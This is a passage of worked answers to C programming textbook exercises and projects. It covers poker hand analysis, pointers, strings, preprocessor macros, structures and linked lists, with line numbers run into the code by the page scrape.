&lt;stdio.h&gt;#include &lt;stdlib.h&gt; #define NUM_CARDS 5#define RANK 0#define SUIT 1 /* external variables */int hand[NUM_CARDS][2];/* 0 1 ____ ____ 0 |____|____| 1 |____|____| 2 |____|____| 3 |____|____| 4 |____|____| rank suit*/ bool straight, flush, four, three;int pairs; /* can be 0, 1, or 2 */ /* prototypes */void read_cards(void);void analyze_hand(void);void print_result(void); /********************************************************** * main: Calls read_cards, analyze_hand, and print_result * * repeatedly. * **********************************************************/int main(void){ for (;;) { read_cards(); analyze_hand(); print_result(); }} /********************************************************** * read_cards: Reads the cards into the external variable * * hand; checks for bad cards and duplicate * * cards. * **********************************************************/void read_cards(void){ char ch, rank_ch, suit_ch; int i, rank, suit; bool bad_card, duplicate_card; int cards_read = 0; while (cards_read &lt; NUM_CARDS) { bad_card = false; printf(\"Enter a card: \"); rank_ch = getchar(); switch (rank_ch) { case '0': exit(EXIT_SUCCESS); case '2': rank = 0; break; case '3': rank = 1; break; case '4': rank = 2; break; case '5': rank = 3; break; case '6': rank = 4; break; case '7': rank = 5; break; case '8': rank = 6; break; case '9': rank = 7; break; case 't': case 'T': rank = 8; break; case 'j': case 'J': rank = 9; break; case 'q': case 'Q': rank = 10; break; case 'k': case 'K': rank = 11; break; case 'a': case 'A': rank = 12; break; default: bad_card = true; } suit_ch = getchar(); switch (suit_ch) { case 'c': case 'C': suit = 0; break; case 'd': case 'D': suit = 1; break; case 'h': case 'H': suit = 2; break; case 's': case 'S': suit = 3; break; default: bad_card = true; } while ((ch = getchar()) != '\\n') if (ch != ' ') bad_card = true; if (bad_card) { printf(\"Bad card; ignored.\\n\"); continue; } duplicate_card = false; for (i = 0; i &lt; cards_read; i++) if (hand[i][RANK] == rank &amp;&amp; hand[i][SUIT] == suit) { printf(\"Duplicate card; ignored.\\n\"); duplicate_card = true; break; } if (!duplicate_card) { hand[cards_read][RANK] = rank; hand[cards_read][SUIT] = suit; cards_read++; } }} /********************************************************** * analyze_hand: Determines whether the hand contains a * * straight, a flush, four-of-a-kind, * * and/or three-of-a-kind; determines the * * number of pairs; stores the results into * * the external variables straight, flush, * * four, three, and pairs. * **********************************************************/void analyze_hand(void){ int rank, suit, card, pass, run; straight = true; flush = true; four = false; three = false; pairs = 0; /* sort cards by rank */ for (pass = 1; pass &lt; NUM_CARDS; pass++) for (card = 0; card &lt; NUM_CARDS - pass; card++) { rank = hand[card][RANK]; suit = hand[card][SUIT]; if (hand[card+1][RANK] &lt; rank) { hand[card][RANK] = hand[card+1][RANK]; hand[card][SUIT] = hand[card+1][SUIT]; hand[card+1][RANK] = rank; hand[card+1][SUIT] = suit; } } /* check for flush */ suit = hand[0][SUIT]; for (card = 1; card &lt; NUM_CARDS; card++) if (hand[card][SUIT] != suit) flush = false; /* check for straight */ for (card = 0; card &lt; NUM_CARDS - 1; card++) if (hand[card][RANK] + 1 != hand[card+1][RANK]) straight = false; /* check for 4-of-a-kind, 3-of-a-kind, and pairs by looking for \"runs\" of cards with identical ranks */ card = 0; while (card &lt; NUM_CARDS) { rank = hand[card][RANK]; run = 0; do { run++; card++; } while (card &lt; NUM_CARDS &amp;&amp; hand[card][RANK] == rank); switch (run) { case 2: pairs++; break; case 3: three = true; break; case 4: four = true; break; } }} /********************************************************** * print_result: Prints the classification of the hand, * * based on the values of the external * * variables straight, flush, four, three, * * and pairs. * **********************************************************/void print_result(void){ if (straight &amp;&amp; flush) printf(\"Straight flush\"); else if (four) printf(\"Four of a kind\"); else if (three &amp;&amp; pairs == 1) printf(\"Full house\"); else if (flush) printf(\"Flush\"); else if (straight) printf(\"Straight\"); else if (three) printf(\"Three of a kind\"); else if (pairs == 2) printf(\"Two pairs\"); else if (pairs == 1) printf(\"Pair\"); else printf(\"High card\"); printf(\"\\n\\n\");} 5. [was #6] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173#include &lt;stdbool.h&gt; /* C99 only */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; #define NUM_RANKS 13#define NUM_SUITS 4#define NUM_CARDS 5 /* external variables */int num_in_rank[NUM_RANKS];int num_in_suit[NUM_SUITS];bool straight, flush, four, three;int pairs; /* can be 0, 1, or 2 */ /* prototypes */void read_cards(void);void analyze_hand(void);void print_result(void); /********************************************************** * main: Calls read_cards, analyze_hand, and print_result * * repeatedly. * **********************************************************/int main(void){ for (;;) { read_cards(); analyze_hand(); print_result(); }} /********************************************************** * read_cards: Reads the cards into the external * * variables num_in_rank and num_in_suit; * * checks for bad cards and duplicate cards. * **********************************************************/void read_cards(void){ bool card_exists[NUM_RANKS][NUM_SUITS]; char ch, rank_ch, suit_ch; int rank, suit; bool bad_card; int cards_read = 0; for (rank = 0; rank &lt; NUM_RANKS; rank++) { num_in_rank[rank] = 0; for (suit = 0; suit &lt; NUM_SUITS; suit++) card_exists[rank][suit] = false; } for (suit = 0; suit &lt; NUM_SUITS; suit++) num_in_suit[suit] = 0; while (cards_read &lt; NUM_CARDS) { bad_card = false; printf(\"Enter a card: \"); rank_ch = getchar(); switch (rank_ch) { case '0': exit(EXIT_SUCCESS); case '2': rank = 0; break; case '3': rank = 1; break; case '4': rank = 2; break; case '5': rank = 3; break; case '6': rank = 4; break; case '7': rank = 5; break; case '8': rank = 6; break; case '9': rank = 7; break; case 't': case 'T': rank = 8; break; case 'j': case 'J': rank = 9; break; case 'q': case 'Q': rank = 10; break; case 'k': case 'K': rank = 11; break; case 'a': case 'A': rank = 12; break; default: bad_card = true; } suit_ch = getchar(); switch (suit_ch) { case 'c': case 'C': suit = 0; break; case 'd': case 'D': suit = 1; break; case 'h': case 'H': suit = 2; break; case 's': case 'S': suit = 3; break; default: bad_card = true; } while ((ch = getchar()) != '\\n') if (ch != ' ') bad_card = true; if (bad_card) printf(\"Bad card; ignored.\\n\"); else if (card_exists[rank][suit]) printf(\"Duplicate card; ignored.\\n\"); else { num_in_rank[rank]++; num_in_suit[suit]++; card_exists[rank][suit] = true; cards_read++; } }} /********************************************************** * analyze_hand: Determines whether the hand contains a * * straight, a flush, four-of-a-kind, * * and/or three-of-a-kind; determines the * * number of pairs; stores the results into * * the external variables straight, flush, * * four, three, and pairs. * **********************************************************/void analyze_hand(void){ int num_consec = 0; int rank, suit; straight = false; flush = false; four = false; three = false; pairs = 0; /* check for flush */ for (suit = 0; suit &lt; NUM_SUITS; suit++) if (num_in_suit[suit] == NUM_CARDS) flush = true; /* check for straight */ rank = 0; while (num_in_rank[rank] == 0) rank++; for (; rank &lt; NUM_RANKS &amp;&amp; num_in_rank[rank] &gt; 0; rank++) num_consec++; if (num_consec == NUM_CARDS) { straight = true; return; } /* check for ace-low straight */ if (num_consec == NUM_CARDS - 1 &amp;&amp; num_in_rank[0] &gt; 0 &amp;&amp; num_in_rank[NUM_RANKS-1] &gt; 0) { straight = true; return; } /* check for 4-of-a-kind, 3-of-a-kind, and pairs */ for (rank = 0; rank &lt; NUM_RANKS; rank++) { if (num_in_rank[rank] == 4) four = true; if (num_in_rank[rank] == 3) three = true; if (num_in_rank[rank] == 2) pairs++; }} /********************************************************** * print_result: Prints the classification of the hand, * * based on the values of the external * * variables straight, flush, four, three, * * and pairs. * **********************************************************/void print_result(void){ if (straight &amp;&amp; flush) printf(\"Straight flush\"); else if (four) printf(\"Four of a kind\"); else if (three &amp;&amp; pairs == 1) printf(\"Full house\"); else if (flush) printf(\"Flush\"); else if (straight) printf(\"Straight\"); else if (three) printf(\"Three of a kind\"); else if (pairs == 2) printf(\"Two pairs\"); else if (pairs == 1) printf(\"Pair\"); else printf(\"High card\"); printf(\"\\n\\n\");} Chapter 11Answers to Selected Exercises2. [was #2] (e), (f), and (i) are legal. (a) is illegal because p is a pointer to an integer and i is an integer. (b) is illegal because *p is an integer and &amp;i is a pointer to an integer. (c) is illegal because &amp;p is a pointer to a pointer to an integer and q is a pointer to an integer. (d) is illegal for reasons similar to (c). (g) is illegal because p is a pointer to an integer and *q is an integer. (h) is illegal because *p is an integer and q is a pointer to an integer. 4. [was #4; modified] 12345678void swap(int *p, int *q){ int temp; temp = *p; *p = *q; *q = temp;} 6. [was #6] 1234567891011121314151617181920void find_two_largest(int a[], int n, int *largest, int *second_largest){ int i; if (a[0] &gt; a[1]) { *largest = a[0]; *second_largest = a[1]; } else { *largest = a[1]; *second_largest = a[0]; } for (i = 2; i &lt; n; i++) if (a[i] &gt; *largest) { *second_largest = *largest; *largest = a[i]; } else if (a[i] &gt; *second_largest) *second_largest = a[i];} Chapter 12Answers to Selected Exercises2. [was #2] The statement is illegal because pointers cannot be added. Here’s a legal statement that has the desired effect: 1middle = low + (high - low) / 2; The value of (high - low) / 2 is an integer, not a pointer, so it can legally be added to low. 4. [was #6] 12345678910111213141516int *top_ptr; void make_empty(void){ top_ptr = &amp;contents[0];} bool is_empty(void){ return top_ptr == &amp;contents[0];} bool is_full(void){ return top_ptr == &amp;contents[STACK_SIZE];} 6. [was #10; modified] 123456789int sum_array(const int a[], int n){ int *p, sum; sum = 0; for (p = a; p &lt; a + n; p++) sum += *p; return sum;} 13. [was #12; modified] 12345678910111213#define N 10 double ident[N][N], *p;int num_zeros = N; for (p = &amp;ident[0][0]; p &lt;= &amp;ident[N-1][N-1]; p++) if (num_zeros == N) { *p = 1.0; num_zeros = 0; } else { *p = 0.0; num_zeros++; } 15. [was #14] 1234int *p; for (p = temperatures[i]; p &lt; temperatures[i] + 24; p++) printf(\"%d \", *p); Answers to Selected Programming Projects1. [was #4] (a) 1234567891011121314151617181920212223#include &lt;stdio.h&gt; #define MSG_LEN 80 /* maximum length of message */ int main(void){ char msg[MSG_LEN]; int i; printf(\"Enter a message: \"); for (i = 0; i &lt; MSG_LEN; i++) { msg[i] = getchar(); if (msg[i] == '\\n') break; } printf(\"Reversal is: \"); for (i--; i &gt;= 0; i--) putchar(msg[i]); putchar('\\n'); return 0;} (b) 12345678910111213141516171819202122#include &lt;stdio.h&gt; #define MSG_LEN 80 /* maximum length of message */ int main(void){ char msg[MSG_LEN], *p; printf(\"Enter a message: \"); for (p = &amp;msg[0]; p &lt; &amp;msg[MSG_LEN]; p++) { *p = getchar(); if (*p == '\\n') break; } printf(\"Reversal is: \"); for (p--; p &gt;= &amp;msg[0]; p--) putchar(*p); putchar('\\n'); return 0;} 3. [was #8] 12345678910111213141516171819202122#include &lt;stdio.h&gt; #define MSG_LEN 80 /* maximum length of message */ int main(void){ char msg[MSG_LEN], *p; printf(\"Enter a message: \"); for (p = msg; p &lt; msg + MSG_LEN; p++) { *p = getchar(); if (*p == '\\n') break; } printf(\"Reversal is: \"); for (p--; p &gt;= msg; p--) putchar(*p); putchar('\\n'); return 0;} Chapter 13Answers to Selected Exercises2. [was #2] (a) Illegal; p is not a character. (b) Legal; output is a. (c) Legal; output is abc. (d) Illegal; *p is not a pointer. 4. [was #4] (a) 123456789101112int read_line(char str[], int n){ int ch, i = 0; while ((ch = getchar()) != '\\n') if (i == 0 &amp;&amp; isspace(ch)) ; /* ignore */ else if (i &lt; n) str[i++] = ch; str[i] = '\\0'; return i;} (b) 12345678910int read_line(char str[], int n){ int ch, i = 0; while (!isspace(ch = getchar())) if (i &lt; n) str[i++] = ch; str[i] = '\\0'; return i;} (c) 123456789101112int read_line(char str[], int n){ int ch, i = 0; do { ch = getchar(); if (i &lt; n) str[i++] = ch; } while (ch != '\\n'); str[i] = '\\0'; return i;} (d) 12345678910111213int read_line(char str[], int n){ int ch, i; for (i = 0; i &lt; n; i++) { ch = getchar(); if (ch == '\\n') break; str[i] = ch; } str[i] = '\\0'; return i;} 6. [was #6] 12345678void censor(char s[]){ int i; for (i = 0; s[i] != '\\0'; i++) if (s[i] == 'f' &amp;&amp; s[i+1] == 'o' &amp;&amp; s[i+2] =='o') s[i] = s[i+1] = s[i+2] = 'x';} Note that the short-circuit evaluation of &amp;&amp; prevents the if statement from testing characters that follow the null character. 8. [was #10] tired-or-wired? 10. [was #12] The value of q is undefined, so the call of strcpy attempts to copy the string pointed to by p into some unknown area of memory. Exercise 2 in Chapter 17 discusses how to write this function correctly. 15. [was #8] (a) 3 (b) 0 (c) The length of the longest prefix of the string s that consists entirely of characters from the string t. Or, equivalently, the position of the first character in s that is not also in t. 16. [was #16] 123456789int count_spaces(const char *s){ int count = 0; while (*s) if (*s++ == ' ') count++; return count;} Answers to Selected Programming Projects1. [was #14] 1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;stdio.h&gt;#include &lt;string.h&gt; #define WORD_LEN 20 void read_line(char str[], int n); int main(void){ char smallest_word[WORD_LEN+1], largest_word[WORD_LEN+1], current_word[WORD_LEN+1]; printf(\"Enter word: \"); read_line(current_word, WORD_LEN); strcpy(smallest_word, strcpy(largest_word, current_word)); while (strlen(current_word) != 4) { printf(\"Enter word: \"); read_line(current_word, WORD_LEN); if (strcmp(current_word, smallest_word) &lt; 0) strcpy(smallest_word, current_word); if (strcmp(current_word, largest_word) &gt; 0) strcpy(largest_word, current_word); } printf(\"\\nSmallest word: %s\\n\", smallest_word); printf(\"Largest word: %s\\n\", largest_word); return 0;} void read_line(char str[], int n){ int ch, i = 0; while ((ch = getchar()) != '\\n') if (i &lt; n) str[i++] = ch; str[i] = '\\0';} 4. [was #18] 123456789101112#include &lt;stdio.h&gt; int main(int argc, char *argv[]){ int i; for (i = argc - 1; i &gt; 0; i--) printf(\"%s \", argv[i]); printf(\"\\n\"); return 0;} 6. [was #20] 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; #define NUM_PLANETS 9 int string_equal(const char *s, const char *t); int main(int argc, char *argv[]){ char *planets[] = {\"Mercury\", \"Venus\", \"Earth\", \"Mars\", \"Jupiter\", \"Saturn\", \"Uranus\", \"Neptune\", \"Pluto\"}; int i, j; for (i = 1; i &lt; argc; i++) { for (j = 0; j &lt; NUM_PLANETS; j++) if (string_equal(argv[i], planets[j])) { printf(\"%s is planet %d\\n\", argv[i], j + 1); break; } if (j == NUM_PLANETS) printf(\"%s is not a planet\\n\", argv[i]); } return 0;} int string_equal(const char *s, const char *t){ int i; for (i = 0; toupper(s[i]) == toupper(t[i]); i++) if (s[i] == '\\0') return 1; return 0;} Chapter 14Answers to Selected Exercises2. [was #2] #define NELEMS(a) ((int) (sizeof(a) / sizeof(a[0]))) 4. [was #4] (a) One problem stems from the lack of parentheses around the replacement list. For example, the statement 1a = 1/AVG(b, c); will be replaced by 1a = 1/(b+c)/2; Even if we add the missing parentheses, though, the macro still has problems, because it needs parentheses around x and y in the replacement list. The preprocessor will turn the statement 1a = AVG(b&lt;c, c&gt;d); into 1a = ((b&lt;c+c&gt;d)/2); which is equivalent to 1a = ((b&lt;(c+c)&gt;d)/2); Here’s the final (corrected) version of the macro: 1#define AVG(x,y) (((x)+(y))/2) (b) The problem is the lack of parentheses around the replacement list. For example, 1a = 1/AREA(b, c); becomes 1a = 1/(b)*(c); Here’s the corrected macro: 1#define AREA(x,y) ((x)*(y)) 5. [was #6] (a) The call of putchar expands into the following statement: 1putchar(('a'&lt;=(s[++i])&amp;&amp;(s[++i])&lt;='z'?(s[++i])-'a'+'A':(s[++i]))); The character a is less than or equal to s[1] (which is b), yielding a true condition. The character s[2] (which is c) is less than or equal to z, which is also true. The value printed is s[3]-'a'+'A', which is D (assuming that the character set is ASCII). (b) The character a is not less than or equal to s[1] (which is 1) so the test condition is false. The value printed is s[2], which is 2. 7. [was #8] (a) 1234long long_max(long x, long y){ return x &gt; y ? x : y;} The preprocessor would actually put all the tokens on one line, but this version is more readable. (b) The problem with types such as unsigned long is that they require two words, which prevents GENERIC_MAX from creating the desired function name. For example, GENERIC_MAX(unsigned long) would expand into 1234unsigned long unsigned long_max(unsigned long x, unsigned long y){ return x &gt; y ? x : y;} (c) To make GENERIC_MAX work with any basic type, use a type definition to rename the type: 1typedef unsigned long ULONG; We can now write GENERIC_MAX(ULONG). 12. [was #10] (c) and (e) will fail, since M is defined. 14. [was #12; modified] Here’s what the program will look like after preprocessing: 1234567891011121314151617181920212223242526272829303132Blank lineBlank lineBlank lineBlank lineBlank lineBlank lineBlank line int main(void){ int a[= 10], i, j, k, m; Blank line i = j;Blank lineBlank lineBlank line i = 10 * j+1; i = (x,y) x-y(j, k); i = ((((j)*(j)))*(((j)*(j)))); i = (((j)*(j))*(j)); i = jk; puts(\"i\" \"j\"); Blank line i = SQR(j);Blank line i = (j); return 0;} Some preprocessors delete white-space characters at the beginning of a line, so your results may vary. Three lines will cause errors when the program is compiled. Two contain syntax errors: 12int a[= 10], i, j, k, m;i = (x,y) x-y(j, k); The third refers to an undefined variable: 1i = jk; Chapter 15Answers to Selected Exercises2. [was #2] (b). Function definitions should not be put in a header file. If a function definition appears in a header file that is included by two (or more) source files, the program can’t be linked, since the linker will see two copies of the function. 6. [was #8] (a) main.c, f1.c, and f2.c. (b) f1.c (assuming that f1.h is not affected by the change). (c) main.c, f1.c, and f2.c, since all three include f1.h. (d) f1.c and f2.c, since both include f2.h. Chapter 16Answers to Selected Exercises2. [was #2; modified] (a) 123struct { double real, imaginary;} c1, c2, c3; (b) 123struct { double real, imaginary;} c1 = {0.0, 1.0}, c2 = {1.0, 0.0}, c3; (c) Only one statement is necessary: 1c1 = c2; (d) 12c3.real = c1.real + c2.real;c3.imaginary = c1.imaginary + c2.imaginary; 4. [was #4; modified] (a) 123typedef struct { double real, imaginary;} Complex; (b) Complex c1, c2, c3; (c) 12345678Complex make_complex(double real, double imaginary){ Complex c; c.real = real; c.imaginary = imaginary; return c;} (d) 12345678Complex add_complex(Complex c1, Complex c2){ Complex c3; c3.real = c1.real + c2.real; c3.imaginary = c1.imaginary + c2.imaginary; return c3;} 11. [was #10; modified] The a member will occupy 8 bytes, the union e will take 8 bytes (the largest member, c, is 8 bytes long), and the array f will require 4 bytes, so the total space allocated for s will be 20 bytes. 14. [was #12; modified] (a) 1234567double area(struct shape s){ if (s.shape_kind == RECTANGLE) return s.u.rectangle.height * s.u.rectangle.width; else return 3.14159 * s.u.circle.radius * s.u.circle.radius;} (b) 12345678struct shape move(struct shape s, int x, int y){ struct shape new_shape = s; new_shape.center.x += x; new_shape.center.y += y; return new_shape;} (c) 123456789101112struct shape scale(struct shape s, double c){ struct shape new_shape = s; if (new_shape.shape_kind == RECTANGLE) { new_shape.u.rectangle.height *= c; new_shape.u.rectangle.width *= c; } else new_shape.u.circle.radius *= c; return new_shape;} 15. [was #14] (a) enum week_days {MON, TUE, WED, THU, FRI, SAT, SUN}; (b) typedef enum {MON, TUE, WED, THU, FRI, SAT, SUN} Week_days; 17. [was #16] All the statements are legal, since C allows integers and enumeration values to be mixed without restriction. Only (a), (d), and (e) are safe. (b) is not meaningful if i has a value other than 0 or 1. (c) will not yield a meaningful result if b has the value 1. Answers to Selected Programming Projects1. [was #6; modified] 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt; #define COUNTRY_COUNT \\ ((int) (sizeof(country_codes) / sizeof(country_codes[0]))) struct dialing_code { char *country; int code;}; const struct dialing_code country_codes[] = {{\"Argentina\", 54}, {\"Bangladesh\", 880}, {\"Brazil\", 55}, {\"Burma (Myanmar)\", 95}, {\"China\", 86}, {\"Colombia\", 57}, {\"Congo, Dem. Rep. of\", 243}, {\"Egypt\", 20}, {\"Ethiopia\", 251}, {\"France\", 33}, {\"Germany\", 49}, {\"India\", 91}, {\"Indonesia\", 62}, {\"Iran\", 98}, {\"Italy\", 39}, {\"Japan\", 81}, {\"Mexico\", 52}, {\"Nigeria\", 234}, {\"Pakistan\", 92}, {\"Philippines\", 63}, {\"Poland\", 48}, {\"Russia\", 7}, {\"South Africa\", 27}, {\"South Korea\", 82}, {\"Spain\", 34}, {\"Sudan\", 249}, {\"Thailand\", 66}, {\"Turkey\", 90}, {\"Ukraine\", 380}, {\"United Kingdom\", 44}, {\"United States\", 1}, {\"Vietnam\", 84}}; int main(void){ int code, i; printf(\"Enter dialing code: \"); scanf(\"%d\", &amp;code); for (i = 0; i &lt; COUNTRY_COUNT; i++) if (code == country_codes[i].code) { printf(\"The country with dialing code %d is %s\\n\", code, country_codes[i].country); return 0; } printf(\"No corresponding country found\\n\"); return 0;} 3. [was #8] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157#include &lt;stdio.h&gt;#include \"readline.h\" #define NAME_LEN 25#define MAX_PARTS 100 struct part { int number; char name[NAME_LEN+1]; int on_hand;}; int find_part(int number, const struct part inv[], int np);void insert(struct part inv[], int *np);void search(const struct part inv[], int np);void update(struct part inv[], int np);void print(const struct part inv[], int np); /********************************************************** * main: Prompts the user to enter an operation code, * * then calls a function to perform the requested * * action. Repeats until the user enters the * * command 'q'. Prints an error message if the user * * enters an illegal code. * **********************************************************/int main(void){ char code; struct part inventory[MAX_PARTS]; int num_parts = 0; for (;;) { printf(\"Enter operation code: \"); scanf(\" %c\", &amp;code); while (getchar() != '\\n') /* skips to end of line */ ; switch (code) { case 'i': insert(inventory, &amp;num_parts); break; case 's': search(inventory, num_parts); break; case 'u': update(inventory, num_parts); break; case 'p': print(inventory, num_parts); break; case 'q': return 0; default: printf(\"Illegal code\\n\"); } printf(\"\\n\"); }} /********************************************************** * find_part: Looks up a part number in the inv array. * * Returns the array index if the part number * * is found; otherwise, returns -1. * **********************************************************/int find_part(int number, const struct part inv[], int np){ int i; for (i = 0; i &lt; np; i++) if (inv[i].number == number) return i; return -1;} /********************************************************** * insert: Prompts the user for information about a new * * part and then inserts the part into the inv * * array. Prints an error message and returns * * prematurely if the part already exists or the * * array is full. * **********************************************************/void insert(struct part inv[], int *np){ int part_number; if (*np == MAX_PARTS) { printf(\"Database is full; can't add more parts.\\n\"); return; } printf(\"Enter part number: \"); scanf(\"%d\", &amp;part_number); if (find_part(part_number, inv, *np) &gt;= 0) { printf(\"Part already exists.\\n\"); return; } inv[*np].number = part_number; printf(\"Enter part name: \"); read_line(inv[*np].name, NAME_LEN); printf(\"Enter quantity on hand: \"); scanf(\"%d\", &amp;inv[*np].on_hand); (*np)++;} /********************************************************** * search: Prompts the user to enter a part number, then * * looks up the part in the inv array. If the * * part exists, prints the name and quantity on * * hand; if not, prints an error message. * **********************************************************/void search(const struct part inv[], int np){ int i, number; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number, inv, np); if (i &gt;= 0) { printf(\"Part name: %s\\n\", inv[i].name); printf(\"Quantity on hand: %d\\n\", inv[i].on_hand); } else printf(\"Part not found.\\n\");} /********************************************************** * update: Prompts the user to enter a part number. * * Prints an error message if the part can't be * * found in the inv array; otherwise, prompts the * * user to enter change in quantity on hand and * * updates the array. * **********************************************************/void update(struct part inv[], int np){ int i, number, change; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number, inv, np); if (i &gt;= 0) { printf(\"Enter change in quantity on hand: \"); scanf(\"%d\", &amp;change); inv[i].on_hand += change; } else printf(\"Part not found.\\n\");} /********************************************************** * print: Prints a listing of all parts in the inv array, * * showing the part number, part name, and * * quantity on hand. Parts are printed in the * * order in which they were entered into the * * array. * **********************************************************/void print(const struct part inv[], int np){ int i; printf(\"Part Number Part Name \" \"Quantity on Hand\\n\"); for (i = 0; i &lt; np; i++) printf(\"%7d %-25s%11d\\n\", inv[i].number, inv[i].name, inv[i].on_hand);} Chapter 17Answers to Selected Exercises2. [was #2; modified] 12345678910char *duplicate(const char *s){ char *temp = malloc(strlen(s) + 1); if (temp == NULL) return NULL; strcpy(temp, s); return temp;} 5. [was #6] (b) and (c) are legal. (a) is illegal because it tries to reference a member of d without mentioning d. (d) is illegal because it uses -&gt; instead of . to reference the c member of d. 7. [was #8] The first call of free will release the space for the first node in the list, making p a dangling pointer. Executing p = p-&gt;next to advance to the next node will have an undefined effect. Here’s a correct way to write the loop, using a temporary pointer that points to the node being deleted: 12345678struct node *temp; p = first;while (p != NULL) { temp = p; p = p-&gt;next; free(temp);} 8. [was #10; modified] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include &lt;stdbool.h&gt; /* C99 only */#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"stack.h\" struct node { int value; struct node *next;}; struct node *top = NULL; void make_empty(void){ struct node *temp; while (top != NULL) { temp = top; top = top-&gt;next; free(temp); }} bool is_empty(void){ return top == NULL;} bool push(int i){ struct node *new_node; new_node = malloc(sizeof(struct node)); if (new_node == NULL) return false; new_node-&gt;value = i; new_node-&gt;next = top; top = new_node; return true;} int pop(void){ struct node *temp; int i; if (is_empty()) { printf(\"*** Stack underflow; program terminated. ***\\n\"); exit(EXIT_FAILURE); } i = top-&gt;value; temp = top; top = top-&gt;next; free(temp); return i;} 15. [was #12] The output of the program is 1Answer: 3 The program tests the values of f2(0), f2(1), f2(2), and so on, stopping when f2 returns zero. It then prints the argument that was passed to f2 to make it return zero. 17. [was #14] Assuming that compare is the name of the comparison function, the following call of qsort will sort the last 50 elements of a: 1qsort(&amp;a[50], 50, sizeof(a[0]), compare); Answers to Selected Programming Projects1. [was #4] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"readline.h\" #define NAME_LEN 25#define INITIAL_PARTS 10 struct part { int number; char name[NAME_LEN+1]; int on_hand;}; struct part *inventory;int num_parts = 0; /* number of parts currently stored */int max_parts = INITIAL_PARTS; /* size of inventory array */ int find_part(int number);void insert(void);void search(void);void update(void);void print(void); /********************************************************** * main: Prompts the user to enter an operation code, * * then calls a function to perform the requested * * action. Repeats until the user enters the * * command 'q'. Prints an error message if the user * * enters an illegal code. * **********************************************************/int main(void){ char code; inventory = malloc(max_parts * sizeof(struct part)); if (inventory == NULL) { printf(\"Can't allocate initial inventory space.\\n\"); exit(EXIT_FAILURE); } for (;;) { printf(\"Enter operation code: \"); scanf(\" %c\", &amp;code); while (getchar() != '\\n') /* skips to end of line */ ; switch (code) { case 'i': insert(); break; case 's': search(); break; case 'u': update(); break; case 'p': print(); break; case 'q': return 0; default: printf(\"Illegal code\\n\"); } printf(\"\\n\"); }} /********************************************************** * find_part: Looks up a part number in the inventory * * array. Returns the array index if the part * * number is found; otherwise, returns -1. * **********************************************************/int find_part(int number){ int i; for (i = 0; i &lt; num_parts; i++) if (inventory[i].number == number) return i; return -1;} /********************************************************** * insert: Prompts the user for information about a new * * part and then inserts the part into the * * database. Prints an error message and returns * * prematurely if the part already exists or the * * database is full. * **********************************************************/void insert(void){ int part_number; struct part *temp; if (num_parts == max_parts) { max_parts *= 2; temp = realloc(inventory, max_parts * sizeof(struct part)); if (temp == NULL) { printf(\"Insufficient memory; can't add more parts.\\n\"); return; } inventory = temp; } printf(\"Enter part number: \"); scanf(\"%d\", &amp;part_number); if (find_part(part_number) &gt;= 0) { printf(\"Part already exists.\\n\"); return; } inventory[num_parts].number = part_number; printf(\"Enter part name: \"); read_line(inventory[num_parts].name, NAME_LEN); printf(\"Enter quantity on hand: \"); scanf(\"%d\", &amp;inventory[num_parts].on_hand); num_parts++;} /********************************************************** * search: Prompts the user to enter a part number, then * * looks up the part in the database. If the part * * exists, prints the name and quantity on hand; * * if not, prints an error message. * **********************************************************/void search(void){ int i, number; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number); if (i &gt;= 0) { printf(\"Part name: %s\\n\", inventory[i].name); printf(\"Quantity on hand: %d\\n\", inventory[i].on_hand); } else printf(\"Part not found.\\n\");} /********************************************************** * update: Prompts the user to enter a part number. * * Prints an error message if the part doesn't * * exist; otherwise, prompts the user to enter * * change in quantity on hand and updates the * * database. * **********************************************************/void update(void){ int i, number, change; printf(\"Enter part number: \"); scanf(\"%d\", &amp;number); i = find_part(number); if (i &gt;= 0) { printf(\"Enter change in quantity on hand: \"); scanf(\"%d\", &amp;change); inventory[i].on_hand += change; } else printf(\"Part not found.\\n\");} /********************************************************** * print: Prints a listing of all parts in the database, * * showing the part number, part name, and * * quantity on hand. Parts are printed in the * * order in which they were entered into the * * database. * **********************************************************/void print(void){ int i; printf(\"Part Number Part Name \" \"Quantity on Hand\\n\"); for (i = 0; i &lt; num_parts; i++) printf(\"%7d %-25s%11d\\n\", inventory[i].number, inventory[i].name, inventory[i].on_hand);} 2. [was #16] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include \"readline.h\" #define NAME_LEN 25#define MAX_PARTS 100 struct part { int number; char name[NAME_LEN+1]; int on_hand;} inventory[MAX_PARTS]; int num_parts = 0; /* number of parts currently stored */ int find_part(int number);void insert(void);void search(void);void update(void);void print(void);int compare_parts(const void *p, const void *q); /********************************************************** * main: Prompts the user to enter an operation code, * * then calls a function to perform the requested * * action. Repeats until the user enters the * * command 'q'. Prints an error message if the user * * enters an illegal code. * **********************************************************/int main(void){ char code; for (;;) { printf(\"Enter operation code: \"); scanf(\" %c\", &amp;code); while (getchar() != '\\n') /* skips to end of line */ ; 